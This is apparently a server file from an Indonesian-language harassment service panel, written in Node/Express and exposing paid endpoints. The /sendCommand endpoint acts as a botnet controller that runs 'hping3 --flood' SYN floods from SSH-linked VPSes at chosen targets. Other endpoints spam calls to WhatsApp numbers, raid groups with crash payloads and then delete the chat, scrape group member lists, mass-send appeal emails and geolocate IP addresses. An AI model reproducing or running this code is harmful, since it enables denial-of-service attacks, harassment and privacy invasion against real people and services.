// ENDPOINT: /api/unban/templates
// ============================================================
app.get('/api/unban/templates', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });

  const list = Object.values(UNBAN_TEMPLATES).map(t => ({
    id: t.id,
    name: t.name,
    to: t.to,
    subject: t.subject
  }));

  res.json({ valid: true, templates: list });
});

// ============================================================
// ENDPOINT: /api/unban/spam
// Kirim appeal Pake Gmail user
// ============================================================
app.post('/api/unban/spam', express.json(), async (req, res) => {
  const { key, templateId, number, name, reason, delay = 30, iterations = 5 } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid key' });

  // ─── CEK GMAIL USER ──────────────────────────────────
  const gmailDB = loadGmailDB();
  const userGmail = gmailDB[keyInfo.username];

  if (!userGmail) {
    return res.json({
      valid: false,
      setupRequired: true,
      message: 'Setup Gmail dulu di menu "Setup Gmail"'
    });
  }

  // ─── CEK LIMIT ───────────────────────────────────────
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  const role = user?.role || 'member';

  const limit = getUserLimit(keyInfo.username, role);
  const totalLimit = USER_LIMITS[role] || USER_LIMITS.default;

  if (limit.used >= totalLimit) {
    return res.json({
      valid: false,
      limitReached: true,
      used: limit.used,
      total: totalLimit,
      message: `Limit lo habis! ${limit.used}/${totalLimit}`
    });
  }

  const template = UNBAN_TEMPLATES[templateId];
  if (!template) return res.json({ valid: false, message: 'Template tidak ditemukan' });

  let cleanNumber = String(number || '').replace(/[^0-9]/g, '');
  if (cleanNumber.startsWith('0')) cleanNumber = '62' + cleanNumber.slice(1);
  if (!cleanNumber.startsWith('62')) cleanNumber = '62' + cleanNumber;

  const jobId = 'UBJ_' + Date.now() + '_' + Math.random().toString(36).slice(2, 6).toUpperCase();
  const totalSend = Math.min(Math.max(parseInt(iterations) || 5, 1), 10);
  const delayMs = Math.min(Math.max(parseInt(delay) || 30, 30), 300) * 1000;

  // ─── INCREMENT LIMIT ─────────────────────────────────
  limit.used++;
  limit.lastUsed = new Date().toISOString();
  limit.history.push({
    time: new Date().toISOString(),
    target: cleanNumber,
    template: template.name,
    gmail: userGmail.gmail
  });
  if (limit.history.length > 50) limit.history = limit.history.slice(-50);

  const limits = loadLimits();
  limits[keyInfo.username] = limit;
  saveLimits(limits);

  // ─── UPDATE LAST USED GMAIL ──────────────────────────
  userGmail.lastUsed = new Date().toISOString();
  saveGmailDB(gmailDB);

  res.json({
    valid: true,
    success: true,
    jobId: jobId,
    totalSend: totalSend,
    targetNumber: cleanNumber,
    from: userGmail.gmail,
    limitUsed: limit.used,
    limitTotal: totalLimit,
    limitRemaining: Math.max(0, totalLimit - limit.used),
    message: `Unban spam mulai — ${totalSend}x dari ${userGmail.gmail}`
  });

  // ─── JALANIN DI BACKGROUND ───────────────────────────
  setImmediate(async () => {
    const appPassword = decrypt(userGmail.appPassword);
    if (!appPassword) return;

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: userGmail.gmail,
        pass: appPassword
      }
    });

    try {
      await transporter.verify();
    } catch(e) {
      console.log(`[❌ GMAIL] ${userGmail.gmail} verify failed: ${e.message}`);
      return;
    }

    unbanJobs[jobId] = {
      running: true,
      total: totalSend,
      sent: 0,
      failed: 0,
      user: keyInfo.username,
      gmail: userGmail.gmail,
      target: cleanNumber,
      status: 'running'
    };

    const dateStr = new Date().toLocaleDateString('en-US', {
      day: 'numeric', month: 'long', year: 'numeric'
    });

    const variations = [
      'Appeal for Banned Account',
      'Request for Account Review',
      'Account Ban Appeal',
      'Urgent: Account Restoration Request',
      'Please Review My Account Status'
    ];

    for (let i = 0; i < totalSend; i++) {
      if (!unbanJobs[jobId].running) break;

      try {
        const body = template.body
          .replace(/{NUMBER}/g, '+' + cleanNumber)
          .replace(/{NAME}/g, name || keyInfo.username)
          .replace(/{REASON}/g, reason || '-')
          .replace(/{DATE}/g, dateStr);

        const subject = `[${i + 1}] ${variations[i % variations.length]} - +${cleanNumber}`;

        const info = await transporter.sendMail({
          from: `"${name || keyInfo.username}" <${userGmail.gmail}>`,
          to: template.to,
          cc: template.cc || undefined,
          subject: subject,
          text: body,
          headers: {
            'X-Priority': '1',
            'X-MSMail-Priority': 'High',
            'Importance': 'high'
          }
        });

        unbanJobs[jobId].sent = i + 1;
        console.log(`[✅ SENT] ${userGmail.gmail} → ${template.to} | ${i + 1}/${totalSend}`);

        if (wsClients[keyInfo.username]) {
          wsClients[keyInfo.username].send(JSON.stringify({
            type: 'unban:progress',
            jobId: jobId,
            sent: i + 1,
            total: totalSend
          }));
        }

      } catch(e) {
        unbanJobs[jobId].failed++;
        console.log(`[❌ FAILED] ${i + 1} | ${e.message}`);
      }

      if (i < totalSend - 1) await sleep(delayMs);
    }

    unbanJobs[jobId].running = false;
    unbanJobs[jobId].status = 'done';

    console.log(`[✅ DONE] Job ${jobId} | ${unbanJobs[jobId].sent}/${totalSend}`);

    if (wsClients[keyInfo.username]) {
      wsClients[keyInfo.username].send(JSON.stringify({
        type: 'unban:done',
        jobId: jobId,
        total: totalSend,
        sent: unbanJobs[jobId].sent,
        failed: unbanJobs[jobId].failed
      }));
    }
  });
});

// ============================================================
// ENDPOINT: /api/unban/job-status
// ============================================================
app.get('/api/unban/job-status', (req, res) => {
  const { key, jobId } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });

  if (jobId) {
    const job = unbanJobs[jobId];
    if (!job) return res.json({ valid: false, message: 'Job not found' });
    return res.json({ valid: true, job });
  }

  const jobs = Object.keys(unbanJobs).map(id => ({
    jobId: id,
    ...unbanJobs[id]
  }));

  res.json({ valid: true, jobs });
});

// ============================================================
// ENDPOINT: /api/unban/stop
// ============================================================
app.post('/api/unban/stop', express.json(), (req, res) => {
  const { key, jobId } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });

  if (jobId && unbanJobs[jobId]) {
    unbanJobs[jobId].running = false;
    return res.json({ valid: true, message: 'Job dihentikan' });
  }

  res.json({ valid: true, message: 'OK' });
});

// ============================================================
// ENDPOINT ADMIN: /api/unban/reset-limit
// ============================================================
app.post('/api/unban/reset-limit', express.json(), (req, res) => {
  const { key, targetUser } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  if (!admin || !['owner', 'dev'].includes((admin.role || '').toLowerCase())) {
    return res.status(403).json({ valid: false, message: 'Owner/Dev only' });
  }

  const limits = loadLimits();

  if (targetUser) {
    if (limits[targetUser]) {
      limits[targetUser].used = 0;
      limits[targetUser].lastReset = new Date().toISOString();
    }
    saveLimits(limits);
    return res.json({ valid: true, message: `Limit ${targetUser} di-reset` });
  }

  // Reset semua
  Object.keys(limits).forEach(u => {
    limits[u].used = 0;
    limits[u].lastReset = new Date().toISOString();
  });
  saveLimits(limits);

  res.json({ valid: true, message: 'Semua limit di-reset' });
});

console.log('✅ UNBAN SPAM (Gmail per user) endpoints registered');

const PORT = process.env.PORT || process.env.SERVER_PORT || 2025;

// Single server listen (HTTP + WebSocket pada port yang sama)
server.listen(PORT, () => {
  console.log(` 
█░█ ▄▀█ █▄░█ ▀█ ▀█░░░░░░░░
▀▄▀ █▀█ █░▀█ █▄ █▄░░░░░░░░

░░░░░░░░░░░░░░░█▀▄▀█ █▀▄
░░░░░░░░░░░░░░░█░▀░█ █▄▀ 
Server aktif di http://114.79.2.132:${PORT}`);
  startUserSessions();
});




app.use(express.urlencoded({ extended: false }));
app.use(express.json());
// ===== Rate Limit Middleware (20 req/detik per token) =====
const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 20) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);


app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*"); // atau ganti * dengan domain spesifik
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});


if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData); // ini array

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000; // +10 menit

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}


function connectToAllVPS() {
  if (!cncActive) return;

  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end(); // Langsung tutup kalau CNC tidak aktif
        return;
      }

      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      // Jika koneksi putus, reconnect otomatis
      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

// 🚫 Disconnect semua koneksi (misal saat restart)
function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

// Load VPS list saat server pertama kali jalan
if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
  console.log("📥 VPS list loaded.");
    connectToAllVPS(); // Connect ke semua VPS saat server jalan
}

// Pantau perubahan file VPS
fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
      connectToAllVPS(); // Connect ke semua VPS saat server jalan
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

// Middleware: Cek sessionKey dan ambil username
function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

// GET /myServer
app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ valid: false, error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  // APK expects: { servers: [...] }
  res.json({ valid: true, servers: userVPS });
});

// POST /addServer
app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

// POST /delServer
app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

// POST /sendCommand
app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});


function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}


// ─── OTP UTILITY FUNCTIONS ──────────────────────────────────────

function fmt08(phone) {
  if (phone.startsWith('62')) return '0' + phone.slice(2);
  if (phone.startsWith('+62')) return '0' + phone.slice(3);
  return phone;
}

function fmtNoCode(phone) {
  if (phone.startsWith('62')) return phone.slice(2);
  if (phone.startsWith('+62')) return phone.slice(3);
  if (phone.startsWith('0')) return phone.slice(1);
  return phone;
}

function fmtPlus(phone) {
  if (!phone.startsWith('+')) return '+' + phone.replace(/^0+/, '62');
  return phone;
}

function fmtPhoneOnly(phone) {
  if (phone.startsWith('62')) return phone.slice(2);
  if (phone.startsWith('+62')) return phone.slice(3);
  if (phone.startsWith('0')) return phone.slice(1);
  return phone;
}

function normalizePhone(phone) {
  let n = phone.replace(/[^0-9+]/g, '');
  if (n.startsWith('+')) n = n.slice(1);
  if (n.startsWith('08')) return '62' + n.slice(1);
  if (n.startsWith('8')) return '62' + n;
  if (n.startsWith('62')) return n;
  return '';
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

function randomString(len) {
  return crypto.randomBytes(Math.ceil(len/2)).toString('hex').slice(0, len);
}

function randomEmail() {
  return randomString(6).toLowerCase() + Math.floor(Math.random() * 999) + '@gmail.com';
}

function randomPassword() {
  return 'Pass' + randomString(4) + Math.floor(Math.random() * 99) + '$';
}

function randomDigits(len) {
  return crypto.randomBytes(Math.ceil(len/2)).toString('hex').slice(0, len);
}

function getRandomUserAgent() {
  const uas = [
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
  ];
  return uas[Math.floor(Math.random() * uas.length)];
}
function genPairId() {
  return crypto.randomBytes(8).toString('hex').toUpperCase();
}


function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}
const spamCooldown = {}; // { username: { count, lastReset } }
const cooldowns = {}; // { username: lastRaidTime }

app.get("/spamCall", async (req, res) => {
  const { key, target, qty } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !["reseller", "reseller1", "owner", "vip", "dev"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const role = user.role || "member";
  const maxQty = role === "vip" ? 10 : 5;
  const callQty = parseInt(qty) || 1;

  if (callQty > maxQty) {
    return res.json({
      valid: false,
      message: `Qty too high. Max allowed for your role (${role}) is ${maxQty}.`
    });
  }

  const bizKeys = Object.keys(activeConnections);
  if (!bizKeys.length) return res.json({ valid: false, message: "No biz socket online" });

  const jid = target.includes("@s.whatsapp.net") ? target : `${target}@s.whatsapp.net`;

  const now = Date.now();
  const cooldown = spamCooldown[user.username] || { count: 0, lastReset: 0 };

  if (now - cooldown.lastReset > 300_000) {
    cooldown.count = 0;
    cooldown.lastReset = now;
  }

  if (cooldown.count >= 5) {
    const remaining = 300 - Math.floor((now - cooldown.lastReset) / 1000);
    return res.json({ valid: false, cooldown: true, message: `Cooldown: wait ${remaining}s` });
  }

  try {
      
    const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
    const sock = biz[socketId];
    // 1. Unblock target dulu
    await sock.updateBlockStatus(jid, "unblock");

    await sock.offerCall(jid, true);
    await sock.updateBlockStatus(jid, "block");
    console.log(`[✅ FIRST SPAM CALL] to ${jid} from ${socketId}`);

    cooldown.count++;
    spamCooldown[user.username] = cooldown;

    res.json({ valid: true, sended: true, total: callQty });

    for (let i = 1; i < callQty; i++) {
      setTimeout(async () => {
        try {
          const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
          const sock = biz[socketId];
                // 1. Unblock target dulu
    await sock.updateBlockStatus(jid, "unblock");

    await sock.offerCall(jid, true);
                // 1. Unblock target dulu
    await sock.updateBlockStatus(jid, "block");

          console.log(`[✅ SPAM CALL] #${i + 1} to ${jid} from ${socketId}`);
        } catch (err) {
          console.warn(`[❌ CALL #${i + 1} ERROR]`, err.message);
        }
      }, i * 10000);
    }
  } catch (err) {
    console.warn("[❌ FIRST CALL ERROR]", err.message);
    return res.json({ valid: false, message: "Call failed" });
  }
});

app.get("/raidGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid group link" });

  return res.json({ valid: true, sended: false });
  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !["vip", "owner"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const now = Date.now();
  if (cooldowns[user.username] && now - cooldowns[user.username] < 500_000) {
    const wait = Math.ceil((500_000 - (now - cooldowns[user.username])) / 1000);
    return res.json({ valid: false, message: `Cooldown aktif, tunggu ${wait} detik` });
  }

  const bizKeys = Object.keys(biz);
  if (bizKeys.length < 2) return res.json({ valid: false, message: "Need at least 2 bot online" });

  const fs = require("fs");
  const path = require("path");
  const dir = path.join(__dirname, "assets");
  const stickers = fs.readdirSync(dir).filter(f => f.endsWith(".webp"));
  if (!stickers.length) return res.json({ valid: false, message: "No stickers found" });

  try {
    const pickRandomSock = async (used = []) => {
      const unused = bizKeys.filter(k => !used.includes(k));
      if (!unused.length) throw new Error("No available bots to use");
      const randKey = unused[Math.floor(Math.random() * unused.length)];
      return { sock: biz[randKey], key: randKey };
    };

    const joinGroup = async () => {
      const usedKeys = [];
      while (true) {
        const { sock, key } = await pickRandomSock(usedKeys);
        usedKeys.push(key);
        try {
          const groupJid = await sock.groupAcceptInvite(code);
          return { sock, groupJid };
        } catch (err) {
          if (err.message.includes("not-authorized")) {
            console.log(`[!] ${key} gagal join, coba bot lain...`);
            continue;
          } else {
            throw err;
          }
        }
      }
    };

    const [s1, s2] = await Promise.all([joinGroup(), joinGroup()]);
    res.json({ valid: true, sended: true });

    cooldowns[user.username] = Date.now();

    const raidBot = async (sock, groupJid) => {
      for (let round = 0; round < 2; round++) {
        const sentMsg = await sock.sendMessage(groupJid, {
          text: `[DarkVerse Project]\n` + 'ꦾ'.repeat(30000)
        });
        await new Promise(r => setTimeout(r, 1000));

        const randomStickers = stickers.sort(() => 0.5 - Math.random()).slice(0, 3);
        for (const sticker of randomStickers) {
          const buffer = fs.readFileSync(path.join(dir, sticker));
          await sock.sendMessage(groupJid, { sticker: buffer });
          await gcCrash(sock, groupJid);
          await FreezePackk(sock, groupJid);
          await new Promise(r => setTimeout(r, 300));
        }

        await new Promise(r => setTimeout(r, 600));
      }

      await sock.groupLeave(groupJid);
      await new Promise(r => setTimeout(r, 500));

      const lastMessagesInChat = {
        key: { remoteJid: groupJid, fromMe: true, id: "" },
        messageTimestamp: Math.floor(Date.now() / 1000)
      };
      await sock.chatModify({
        delete: true,
        lastMessages: [lastMessagesInChat]
      }, groupJid);

      console.log(`[!] Selesai raid & hapus chat: ${groupJid}`);
    };

    await Promise.all([
      raidBot(s1.sock, s1.groupJid),
      raidBot(s2.sock, s2.groupJid)
    ]);

    return;
  } catch (err) {
    console.warn("[❌ RAID ERROR]", err.message);
    return res.json({ valid: false, message: "Join or send failed" });
  }
});

app.get("/spyGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid link" });

  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No socket available" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];

  try {
    const groupJid = await sock.groupAcceptInvite(code);
    const metadata = await sock.groupMetadata(groupJid);

    const admins = metadata.participants.filter(p => p.admin).map(p => p.id.replace(/@.+/, ''));
    const members = metadata.participants.filter(p => !p.admin).map(p => p.id.replace(/@.+/, ''));

    await sock.groupLeave(groupJid);

    return res.json({
      valid: true,
      groupId: groupJid,
      groupName: metadata.subject,
      desc: metadata.desc || "No description",
      admin: admins,
      participant: members,
    });
  } catch (err) {
    console.warn("[❌ SPY GROUP ERROR]", err.message);
    return res.json({ valid: false, message: "Spy failed" });
  }
});


const ipLogs = {};

// ─── HELPER: CLEAN IP ───────────────────────────────────────
function cleanIpAddress(ip) {
  if (!ip) return "";
  let cleaned = String(ip).trim();
  
  // Hapus ::ffff: prefix (IPv6-mapped IPv4)
  if (cleaned.startsWith("::ffff:")) {
    cleaned = cleaned.replace("::ffff:", "");
  }
  
  // Hapus bracket IPv6
  if (cleaned.startsWith("[") && cleaned.endsWith("]")) {
    cleaned = cleaned.slice(1, -1);
  }
  
  // Hapus port kalau ada
  if (cleaned.includes(":") && !cleaned.includes("::")) {
    cleaned = cleaned.split(":")[0];
  }
  
  return cleaned.trim();
}

// ─── HELPER: LOOKUP IP (MULTI API FALLBACK) ─────────────────
async function lookupIPGeo(ip) {
  // ─── API 1: ipwho.is (unlimited) ────────────────────────
  try {
    const r = await axios.get("https://ipwho.is/" + ip, {
      timeout: 8000,
      headers: { 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" 
      }
    });
    
    if (r.data && r.data.success !== false) {
      return {
        success: true,
        source: "ipwho.is",
        city: r.data.city || "Unknown",
        region: r.data.region || "Unknown",
        country: r.data.country || "Unknown",
        countryCode: r.data.country_code || "?",
        postal: r.data.postal || "Unknown",
        lat: r.data.latitude,
        lon: r.data.longitude,
        isp: r.data.connection?.isp || "Unknown",
        asn: r.data.connection?.asn ? ("AS" + r.data.connection.asn) : "Unknown",
        org: r.data.connection?.org || "Unknown",
        timezone: r.data.timezone?.id || "Unknown",
        utcOffset: r.data.timezone?.utc || "Unknown",
        currency: r.data.currency?.code || "Unknown",
        currencyName: r.data.currency?.name || "Unknown",
        flag: r.data.flag?.emoji || "🏳️",
        continent: r.data.continent || "Unknown",
        capital: r.data.capital || "Unknown"
      };
    }
  } catch (e) {
    console.error("[LOOKUP] ipwho.is failed:", e.message);
  }

  // ─── API 2: ip-api.com (gratis 45req/menit) ──────────────
  try {
    const r = await axios.get("http://ip-api.com/json/" + ip + "?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query", {
      timeout: 8000
    });
    
    if (r.data && r.data.status === "success") {
      return {
        success: true,
        source: "ip-api.com",
        city: r.data.city || "Unknown",
        region: r.data.regionName || "Unknown",
        country: r.data.country || "Unknown",
        countryCode: r.data.countryCode || "?",
        postal: r.data.zip || "Unknown",
        lat: r.data.lat,
        lon: r.data.lon,
        isp: r.data.isp || "Unknown",
        asn: r.data.as || "Unknown",
        org: r.data.org || "Unknown",
        timezone: r.data.timezone || "Unknown",
        utcOffset: "Unknown",
        currency: "Unknown",
        currencyName: "Unknown",
        flag: "🏳️",
        continent: "Unknown",
        capital: "Unknown"
      };
    }
  } catch (e) {
    console.error("[LOOKUP] ip-api.com failed:", e.message);
  }

  // ─── API 3: ipinfo.io (gratis 50k/bulan) ─────────────────
  try {
    const r = await axios.get("https://ipinfo.io/" + ip + "/json", {
      timeout: 8000
    });
    
    if (r.data && r.data.loc) {
      const [lat, lon] = r.data.loc.split(",");
      return {
        success: true,
        source: "ipinfo.io",
        city: r.data.city || "Unknown",
        region: r.data.region || "Unknown",
        country: r.data.country || "Unknown",
        countryCode: r.data.country || "?",
        postal: r.data.postal || "Unknown",
        lat: parseFloat(lat),
        lon: parseFloat(lon),
        isp: r.data.org || "Unknown",
        asn: "Unknown",
        org: r.data.org || "Unknown",
        timezone: r.data.timezone || "Unknown",
        utcOffset: "Unknown",
        currency: "Unknown",
        currencyName: "Unknown",
        flag: "🏳️",
        continent: "Unknown",
        capital: "Unknown"
      };
    }
  } catch (e) {
    console.error("[LOOKUP] ipinfo.io failed:", e.message);
  }

  return { success: false };
}


// ════════════════════════════════════════════════════════════════════════════
// TEMP IP — LOOKUP MANUAL
// ════════════════════════════════════════════════════════════════════════════

app.get("/tempIp", async (req, res) => {
  const { key, ip } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, message: "User not found" });

  const allowedRoles = [
    "owner", "dev", "tk", "tangan kanan", "admin",
    "reseller", "member", "vip", "moderator", "partner",
    "founder", "high admin", "high owner"
  ];
  const userRole = (user.role || "member").toLowerCase();
  if (!allowedRoles.includes(userRole)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  if (!ip) return res.json({ valid: false, message: "IP required" });

  // Clean IP
  const cleanIp = cleanIpAddress(ip);

  // Regex IPv4
  const ipRegex = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
  if (!ipRegex.test(cleanIp)) {
    return res.json({ valid: false, message: "Invalid IP format" });
  }

  try {
    console.log("[TEMP IP] 🔍 Lookup: " + cleanIp);

    const geo = await lookupIPGeo(cleanIp);

    if (!geo.success) {
      return res.json({ 
        valid: false, 
        message: "IP lookup failed. Coba lagi nanti." 
      });
    }

    // ─── GOOGLE MAPS URL ────────────────────────────────────
    const mapsUrl = "https://www.google.com/maps?q=" + geo.lat + "," + geo.lon;
    const mapsEmbedUrl = "https://maps.google.com/maps?q=" + geo.lat + "," + geo.lon + "&z=15&output=embed";

    // ─── RESPONSE ───────────────────────────────────────────
    const result = {
      valid: true,
      ip: cleanIp,
      // Location
      city: geo.city,
      region: geo.region,
      country: geo.country,
      countryCode: geo.countryCode,
      postal: geo.postal,
      continent: geo.continent,
      capital: geo.capital,
      flag: geo.flag,
      // Coordinates
      latitude: geo.lat,
      longitude: geo.lon,
      // Network
      isp: geo.isp,
      asn: geo.asn,
      org: geo.org,
      // Timezone
      timezone: geo.timezone,
      utcOffset: geo.utcOffset,
      // Currency
      currency: geo.currency,
      currencyName: geo.currencyName,
      // Maps
      mapsUrl: mapsUrl,
      mapsEmbedUrl: mapsEmbedUrl,
      // Meta
      source: geo.source,
      lookedUpAt: new Date().toISOString(),
      lookedUpBy: user.username
    };

    // Log
    fs.appendFileSync("temp_ip_log.txt",
      "[" + new Date().toISOString() + "] " + user.username + " → " + cleanIp + " | " + geo.city + ", " + geo.country + " | " + geo.source + "\n"
    );

    console.log("[TEMP IP] ✅ " + cleanIp + " → " + geo.city + ", " + geo.country);

    return res.json(result);

  } catch (err) {
    console.error("[TEMP IP] ❌ Error:", err.message);
    return res.json({ valid: false, message: err.message });
  }
});

// ─── ENDPOINT: /tempIp/history ──────────────────────────────
app.get("/tempIp/history", async (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, message: "User not found" });

  try {
    let logs = [];
    if (fs.existsSync("temp_ip_log.txt")) {
      const content = fs.readFileSync("temp_ip_log.txt", "utf8");
      logs = content.split("\n")
